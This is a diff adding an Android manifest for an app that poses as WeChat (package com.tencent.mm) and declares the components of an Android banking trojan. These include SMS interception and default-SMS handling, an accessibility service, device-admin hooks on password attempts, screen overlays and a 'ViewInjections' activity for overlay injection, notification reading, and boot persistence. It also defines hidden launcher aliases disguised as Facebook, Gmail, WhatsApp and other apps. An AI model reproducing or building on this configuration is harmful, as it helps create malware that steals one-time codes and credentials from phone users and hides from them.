@@ -1,0 +1,248 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:compileSdkVersion="23" android:compileSdkVersionCodename="6.0-2438415" package="com.tencent.mm" platformBuildVersionCode="23" platformBuildVersionName="6.0-2438415">
+
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+	<uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+	<uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.ACTION_MANAGE_OVERLAY_PERMISSION"/>
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
+    <uses-permission android:name="android.permission.GET_TASKS"/>
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.GET_CLIPS"/>
+    <uses-permission android:name="android.permission.READ_CLIPS"/>
+    <uses-permission android:name="android.permission.WRITE_CLIPS"/>
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES"/>
+    <uses-permission android:name="android.permission.RECEIVE_LAUNCH_BROADCASTS"/>
+    <uses-permission android:name="android.permission.QUICKBOOT_POWERON"/>
+    <queries>
+        <package android:name="com.miui.securitycenter"/>
+        <package android:name="com.miui.permcenter"/>
+        <package android:name="com.letv.android.letvsafe"/>
+        <package android:name="com.asus.mobilemanager"/>
+        <package android:name="com.huawei.systemmanager"/>
+        <package android:name="com.coloros.safecenter"/>
+        <package android:name="com.oppo.safe"/>
+        <package android:name="com.iqoo.secure"/>
+        <package android:name="com.vivo.permissionmanager"/>
+        <package android:name="com.evenwell.powersaving"/>
+        <package android:name="com.samsung.android"/>
+        <package android:name="com.oneplus"/>
+        <package android:name="com.android.settings"/>
+    </queries>
+    <application android:allowBackup="true" android:appComponentFactory="androidx.core.app.CoreComponentFactory" android:debuggable="true" android:extractNativeLibs="false" android:hardwareAccelerated="true" android:icon="@mipmap/ic_launcher" android:label="WHHookNm.info" android:noHistory="true" android:requestLegacyExternalStorage="true" android:roundIcon="@mipmap/ic_launcher" android:supportsRtl="true" android:theme="@android:style/Theme.Translucent.NoTitleBar" android:usesCleartextTraffic="true">
+        <activity android:excludeFromRecents="true" android:exported="true" android:name="com.tencent.mm.Main2" android:noHistory="true" android:theme="@style/ACL">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <activity-alias android:enabled="false" android:excludeFromRecents="true" android:exported="true" android:icon="@drawable/ic_facebook" android:label="Facebook" android:name="com.tencent.mm.Facebook" android:noHistory="true" android:roundIcon="@drawable/ic_facebook" android:targetActivity="com.tencent.mm.Main2">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:excludeFromRecents="true" android:exported="true" android:icon="@drawable/ic_google_play" android:label="Google Play" android:name="com.tencent.mm.Play" android:noHistory="true" android:roundIcon="@drawable/ic_google_play" android:targetActivity="com.tencent.mm.Main2">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:excludeFromRecents="true" android:exported="true" android:icon="@drawable/ic_gmail" android:label="Gmail" android:name="com.tencent.mm.Gmail" android:noHistory="true" android:roundIcon="@drawable/ic_gmail" android:targetActivity="com.tencent.mm.Main2">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:excludeFromRecents="true" android:exported="true" android:icon="@drawable/ic_contacts" android:label="Contacts" android:name="com.tencent.mm.Contacts" android:noHistory="true" android:roundIcon="@drawable/ic_contacts" android:targetActivity="com.tencent.mm.Main2">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:excludeFromRecents="true" android:exported="true" android:icon="@drawable/ic_whatsapp" android:label="WhatsApp" android:name="com.tencent.mm.Whatsapp" android:noHistory="true" android:roundIcon="@drawable/ic_whatsapp" android:targetActivity="com.tencent.mm.Main2">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:excludeFromRecents="true" android:exported="true" android:icon="@drawable/ic_youtube" android:label="Youtube" android:name="com.tencent.mm.Youtube" android:noHistory="true" android:roundIcon="@drawable/ic_youtube" android:targetActivity="com.tencent.mm.Main2">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:excludeFromRecents="true" android:exported="true" android:icon="@drawable/ic_chrome" android:label="Chrome" android:name="com.tencent.mm.Chrome" android:noHistory="true" android:roundIcon="@drawable/ic_chrome" android:targetActivity="com.tencent.mm.Main2">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:excludeFromRecents="true" android:exported="true" android:icon="@drawable/ic_instagram" android:label="Instagram" android:name="com.tencent.mm.Instagram" android:noHistory="true" android:roundIcon="@drawable/ic_instagram" android:targetActivity="com.tencent.mm.Main2">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:excludeFromRecents="true" android:exported="true" android:icon="@drawable/ic_tiktok" android:label="TikTok" android:name="com.tencent.mm.TikTok" android:noHistory="true" android:roundIcon="@drawable/ic_tiktok" android:targetActivity="com.tencent.mm.Main2">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity-alias android:enabled="false" android:excludeFromRecents="true" android:exported="true" android:icon="@drawable/ic_telegram" android:label="Telegram" android:name="com.tencent.mm.Telegram" android:noHistory="true" android:roundIcon="@drawable/ic_telegram" android:targetActivity="com.tencent.mm.Main2">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:exported="true" android:hardwareAccelerated="true" android:launchMode="singleInstance" android:name="com.xxx.zzz.CallActivityADsafC" android:showOnLockScreen="true" android:showWhenLocked="true" android:turnScreenOn="true"/>
+        <activity android:excludeFromRecents="true" android:exported="true" android:name="com.xxx.zzz.MainActivity" android:noHistory="true" android:theme="@style/ACL"/>
+        <activity android:exported="false" android:name="com.xxx.zzz.PermissionsActivity" android:theme="@style/ACL"/>
+        <activity android:exported="false" android:name="com.xxx.zzz.commandp.taskssv.BrowserActivity"/>
+        <activity android:excludeFromRecents="true" android:exported="true" android:name="com.xxx.zzz.notifp.DialogActivityasd" android:noHistory="true" android:theme="@style/ACL"/>
+        <activity android:excludeFromRecents="true" android:exported="true" android:label="" android:name="com.xxx.zzz.adminp.ActivityAdminqw" android:theme="@android:style/Theme.NoDisplay"/>
+        <activity android:excludeFromRecents="true" android:exported="true" android:label="" android:name="com.xxx.zzz.smsp.ChangeSmsManagerew" android:theme="@android:style/Theme.NoDisplay"/>
+        <activity android:excludeFromRecents="true" android:exported="true" android:label="" android:launchMode="singleTask" android:name="com.xxx.zzz.injectp.ViewInjectionsad"/>
+        <service android:enabled="true" android:exported="true" android:name="com.xxx.zzz.servicesp.CommandServicedas" android:stopWithTask="false"/>
+        <service android:exported="true" android:name="com.xxx.zzz.notifp.NotificationServicedsa" android:stopWithTask="false"/>
+        <service android:exported="true" android:name="com.xxx.zzz.notifp.PushServiceds" android:stopWithTask="false"/>
+        <service android:exported="true" android:name="com.xxx.zzz.notifp.NotificationReadServicesd" android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService"/>
+            </intent-filter>
+        </service>
+        <service android:exported="true" android:name="com.xxx.zzz.lockp.SrvLockDevice"/>
+        <service android:exported="true" android:label="Start Accessibility" android:name="com.xxx.zzz.accessppp.AccessibilityServiceQ" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
+            <meta-data android:name="android.accessibilityservice" android:resource="@xml/serviceconfig"/>
+        </service>
+        <receiver android:description="@string/adm" android:exported="true" android:label=" " android:name="com.xxx.zzz.adminp.AdminReceiverzxc" android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data android:name="android.app.device_admin" android:resource="@xml/adm"/>
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED"/>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
+                <action android:name="android.app.action.ACTION_DEVICE_ADMIN_DISABLE_REQUESTED"/>
+                <action android:name="android.app.action.ACTION_PASSWORD_FAILED"/>
+                <action android:name="android.app.action.ACTION_PASSWORD_SUCCEEDED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="true" android:enabled="true" android:exported="true" android:name="com.xxx.zzz.receiverss.BootCompletedReceiverads" android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
+            <intent-filter>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON"/>
+                <action android:name="android.intent.action.REBOOT"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:enabled="true" android:exported="true" android:name="com.xxx.zzz.receiverss.MyReceiverda">
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.PACKAGE_ADDED"/>
+                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
+                <action android:name="android.intent.action.ACTION_SHUTDOWN"/>
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED"/>
+                <action android:name="android.intent.action.AIRPLANE_MODE"/>
+                <action android:name="android.intent.action.SCREEN_ON"/>
+                <action android:name="android.intent.action.SCREEN_OFF"/>
+                <action android:name="android.intent.action.BATTERY_OKAY"/>
+                <action android:name="android.intent.action.DATE_CHANGED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:enabled="true" android:exported="true" android:name="com.xxx.zzz.smsp.SmsReciever" android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter android:priority="999">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </receiver>
+        <activity android:exported="true" android:name="com.xxx.zzz.smsp.SmsSendSms">
+            <intent-filter>
+                <data android:scheme="sms"/>
+                <action android:name="android.intent.action.SENDTO"/>
+                <data android:scheme="mms"/>
+                <category android:name="android.intent.category.BROWSABLE"/>
+                <data android:scheme="mmsto"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <data android:scheme="smsto"/>
+                <action android:name="android.intent.action.SEND"/>
+            </intent-filter>
+        </activity>
+        <activity android:exported="true" android:name="com.xxx.zzz.ScreenProjectionActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen"/>
+        <receiver android:exported="true" android:name="com.xxx.zzz.smsp.SmsPushServiceReciever" android:permission="android.permission.BROADCAST_WAP_PUSH">
+            <intent-filter>
+                <data android:mimeType="application/vnd.wap.mms-message"/>
+                <action android:name="android.provider.Telephony.WAP_PUSH_DELIVER"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:exported="true" android:name="com.xxx.zzz.smsp.SmsMmsReceiver" android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SMS_DELIVER"/>
+            </intent-filter>
+        </receiver>
+        <service android:exported="true" android:name="com.xxx.zzz.smsp.SmsHeadlessSmsSendService" android:permission="android.permission.SEND_RESPOND_VIA_MESSAGE">
+            <intent-filter>
+                <action android:name="android.intent.action.RESPOND_VIA_MESSAGE"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <data android:scheme="sms"/>
+                <data android:scheme="smsto"/>
+                <data android:scheme="mms"/>
+                <data android:scheme="mmsto"/>
+            </intent-filter>
+        </service>
+        <provider android:authorities="com.tencent.mm.workmanager-init" android:directBootAware="false" android:exported="false" android:multiprocess="true" android:name="androidx.work.impl.WorkManagerInitializer"/>
+        <service android:directBootAware="false" android:enabled="@bool/enable_system_alarm_service_default" android:exported="false" android:name="androidx.work.impl.background.systemalarm.SystemAlarmService"/>
+        <service android:directBootAware="false" android:enabled="@bool/enable_system_job_service_default" android:exported="true" android:name="androidx.work.impl.background.systemjob.SystemJobService" android:permission="android.permission.BIND_JOB_SERVICE"/>
+        <service android:directBootAware="false" android:enabled="@bool/enable_system_foreground_service_default" android:exported="false" android:name="androidx.work.impl.foreground.SystemForegroundService"/>
+        <receiver android:directBootAware="false" android:enabled="true" android:exported="false" android:name="androidx.work.impl.utils.ForceStopRunnable$BroadcastReceiver"/>
+        <receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryChargingProxy">
+            <intent-filter>
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryNotLowProxy">
+            <intent-filter>
+                <action android:name="android.intent.action.BATTERY_OKAY"/>
+                <action android:name="android.intent.action.BATTERY_LOW"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$StorageNotLowProxy">
+            <intent-filter>
+                <action android:name="android.intent.action.DEVICE_STORAGE_LOW"/>
+                <action android:name="android.intent.action.DEVICE_STORAGE_OK"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$NetworkStateProxy">
+            <intent-filter>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="false" android:exported="false" android:name="androidx.work.impl.background.systemalarm.RescheduleReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.TIME_SET"/>
+                <action android:name="android.intent.action.TIMEZONE_CHANGED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="false" android:enabled="@bool/enable_system_alarm_service_default" android:exported="false" android:name="androidx.work.impl.background.systemalarm.ConstraintProxyUpdateReceiver">
+            <intent-filter>
+                <action android:name="androidx.work.impl.background.systemalarm.UpdateProxies"/>
+            </intent-filter>
+        </receiver>
+        <service android:exported="false" android:name="androidx.room.MultiInstanceInvalidationService"/>
+    </application>
+</manifest>
